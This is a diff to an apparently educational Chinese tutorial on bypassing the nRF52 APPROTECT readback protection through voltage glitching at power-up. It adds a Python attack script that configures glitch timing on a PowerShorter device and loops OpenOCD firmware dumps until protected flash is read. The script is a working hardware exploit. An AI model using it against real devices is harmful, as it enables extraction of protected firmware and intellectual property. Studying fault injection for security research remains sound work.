@@ -21,7 +21,7 @@
 - [Pico 示波器软件](https://www.picotech.com/downloads)
 - [zadig](https://zadig.akeo.ie/)
 
-
+------
 
 # APPROTECT 介绍与开启
 
@@ -74,7 +74,7 @@ JFlash 软件在探测到保护开启时直接点击 Yes 即可解除保护
 
 芯片上电后会读取该寄存器的值，若为 0x00 则配置保护机制，不允许通过 SWD 接口访问芯片内固件，因此我们可以在芯片上电时对其进行故障注入，绕过该配置流程，使得调试接口保持开启状态
 
-
+------
 
 # 故障注入绕过 APPROTECT 读保护
 
@@ -131,3 +131,91 @@ A 通道(蓝色波形)为供电电压；B 通道(红色波形)为 DEC1 电压
 DEC1 的下降沿位置恰好被故障毛刺命中，不再表现为下降沿，但并不是没有下降沿就为成功
 
 ![image-20241210110739940](./img/image-20241210110739940.png)
+
+
+
+## 攻击脚本
+
+**推荐使用 Jupyter Lab 进行实验**
+
+导入 Python 库
+
+```
+from power_shorter import *
+import time, os, random, subprocess
+import serial
+import faultviz
+```
+
+初始化设备
+
+```
+ps_dev = PowerShorter('com55')
+```
+
+测试设备上下电
+
+```
+ps_dev.gpio(GPIO.GPIO1, 0)
+time.sleep(1)
+ps_dev.gpio(GPIO.GPIO1, 1)
+```
+
+初始化 faultviz 服务与表单
+
+```
+faultviz.start_view_service(port=12345) 
+vt = faultviz.ViewWidget()
+```
+
+定义攻击函数
+
+```
+def nrf52_attack():
+    ps_dev.gpio(GPIO.GPIO1, 0)
+    time.sleep(1)
+    glitch_delay = random.randint(158500, 158700) # 设置毛刺延迟范围
+    glitch_pulse = random.randint(100, 300)       # 设置毛刺宽度范围
+    ps_dev.engine_cfg(Engine.E1, [(0, glitch_delay), (1, glitch_pulse), (0, 1)], TRIGGER_MODE.RISE)    # 设置毛刺延时及宽度
+    ps_dev.arm(Engine.E1)        # 激活毛刺
+    ps_dev.gpio(GPIO.GPIO1, 1)   # 设备上电
+    time.sleep(0.5)              # 延迟一段时间 等待攻击完成
+    s = ps_dev.state(Engine.E1)  # 检查毛刺状态
+    if s == "glitched":
+        res, result = subprocess.getstatusoutput('openocd -f interface/jlink.cfg -c "transport select swd" -f target/nrf52.cfg -c "init;dump_image nrf_flash.bin 0x0 0x10000;exit"')  # 通过 OpenOCD dump 固件，若成功则表示已绕过 APPROTECT
+        if "Could not find MEM-AP to control the core" in result:
+            status = "Normal"
+        elif "No J-Link device found" in result:
+            status = "No Jlink"
+        elif res == 0:
+            status = "Success"
+        else:
+            status = "Unknown"
+        vt.update(state = status, delay = glitch_delay, pulse = glitch_pulse, result = result, res = res)  # 更新故障结果到表单
+        return res
+    else:
+        print("no trigger")
+```
+
+执行一次攻击函数，检查代码是否有问题
+
+```
+nrf52_attack()
+```
+
+查看表单，检查刚才的攻击是否将结果添加到表单中
+
+```
+vt.show()
+```
+
+写个循环，直到成功绕过 APPROTECT 才停止攻击，循环过程中故障参数及结果会不断添加到 vt 表单中，配合示波器调整参数，优化毛刺位置
+
+```
+doAttack = 1
+while(doAttack):
+    doAttack = nrf52_attack()
+```
+
+
+
